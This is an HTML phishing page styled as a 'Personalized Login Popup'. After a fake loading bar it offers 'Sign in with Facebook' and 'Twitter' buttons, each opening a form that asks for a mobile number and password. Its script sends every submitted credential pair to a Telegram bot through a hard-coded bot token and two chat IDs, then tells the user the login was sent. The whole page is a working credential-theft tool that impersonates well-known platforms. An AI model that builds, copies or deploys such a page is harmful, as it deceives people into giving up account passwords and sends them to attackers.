<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Personalized Login Popup</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    body {
      margin: 0;
      background-color: black;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      position: relative;
      user-select: none;
    }

    img {
      position: absolute;
      max-width: 100%;
      max-height: 100%;
      opacity: 0;
      transition: opacity 2s ease-in-out;
    }

    .visible {
      opacity: 1;
    }

    .loading-container {
      position: absolute;
      bottom: 10%;
      left: 5%;
      right: 5%;
      height: 5px;
      background-color: #333;
      overflow: hidden;
      display: none;
      box-shadow: 0 0 10px rgba(255, 255, 0, 0.7);
    }

    .loading-bar {
      width: 0%;
      height: 100%;
      background-color: #b88b00;
      transition: width 0.5s linear;
    }

    .login-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 200px;
      position: absolute;
      bottom: 5%;
      left: 50%;
      transform: translateX(-50%);
      opacity: 0;
      transition: opacity 1s ease-in-out;
    }

    .login-button {
      width: 100%;
      padding: 6px 10px;
      text-align: center;
      border: none;
      border-radius: 5px;
      margin: 2px 0;
      cursor: pointer;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      box-sizing: border-box;
      font-size: 12px;
    }

    .twitter-button,
    .more-button {
      background-color: #808080;
      color: #fff;
    }

    .facebook-button {
      background-color: #1877f2;
      color: #fff;
    }

    .icon {
      margin-right: 5px;
    }

    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 300px;
      background-color: white;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      padding: 20px;
      z-index: 1000;
    }

    .popup h3 {
      margin-top: 0;
      font-size: 16px;
      color: #333;
      text-align: center;
    }

    .popup form {
      display: flex;
      flex-direction: column;
    }

    .popup input {
      margin-bottom: 10px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .popup button {
      padding: 10px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }

    .overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 999;
    }
  </style>
</head>
<body>
  <img id="image1" src="https://i.ibb.co/PD59wMr/IMG-20250106-171004.png" alt="Image 1">
  <img id="image2" src="https://i.ibb.co/hFnDxcT/IMG-20250106-170944.png" alt="Image 2">

  <!-- Loading Bar -->
  <div class="loading-container" id="loadingContainer">
    <div class="loading-bar" id="loadingBar"></div>
  </div>

  <!-- Login Container -->
  <div class="login-container" id="loginContainer">
    <button class="login-button facebook-button" data-platform="Facebook">
      <i class="fab fa-facebook-f icon"></i> Sign in with Facebook
    </button>
    <p class="or">or</p>
    <button class="login-button twitter-button" data-platform="Twitter">
      <i class="fab fa-twitter icon"></i> Twitter
    </button>
  </div>

  <!-- Popup -->
  <div class="overlay" id="overlay"></div>
  <div class="popup" id="popup">
    <h3 id="popupTitle"></h3>
    <form id="loginForm">
      <input type="text" id="mobile" placeholder="Mobile Number" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    const loadingContainer = document.getElementById('loadingContainer');
    const loadingBar = document.getElementById('loadingBar');
    const loginContainer = document.getElementById('loginContainer');
    const overlay = document.getElementById('overlay');
    const popup = document.getElementById('popup');
    const popupTitle = document.getElementById('popupTitle');
    const loginForm = document.getElementById('loginForm');

    const botToken = "8002940451:AAHIVzvylhtAqkvyVLlMIJNiLCCxYylMdP4";
    const chatIds = [6261873071, 7344990991];

    // Simulate loading animation
    function startLoading() {
      loadingContainer.style.display = 'block';
      let progress = 0;
      const interval = setInterval(() => {
        if (progress < 100) {
          progress++;
          loadingBar.style.width = progress + '%';
        } else {
          clearInterval(interval);
          setTimeout(() => {
            loadingContainer.style.display = 'none';
            loginContainer.style.opacity = 1;
          }, 500);
        }
      }, 50);
    }

    // Show popup with login form
    document.querySelectorAll('.login-button').forEach((button) => {
      button.addEventListener('click', () => {
        const platform = button.dataset.platform;
        popupTitle.textContent = `Login with ${platform}`;
        popup.style.display = 'block';
        overlay.style.display = 'block';
      });
    });

    // Close popup
    overlay.addEventListener('click', () => {
      popup.style.display = 'none';
      overlay.style.display = 'none';
    });

    // Send form data to Telegram
    loginForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const mobile = document.getElementById('mobile').value;
      const password = document.getElementById('password').value;

      chatIds.forEach((chatId) => {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const message = `Login Attempt:\nMobile: ${mobile}\nPassword: ${password}`;

        fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ chat_id: chatId, text: message }),
        });
      });

      alert('Login information sent to Telegram.');
      popup.style.display = 'none';
      overlay.style.display = 'none';
    });

    // Start the loading animation
    startLoading();
  </script>
</body>
</html>
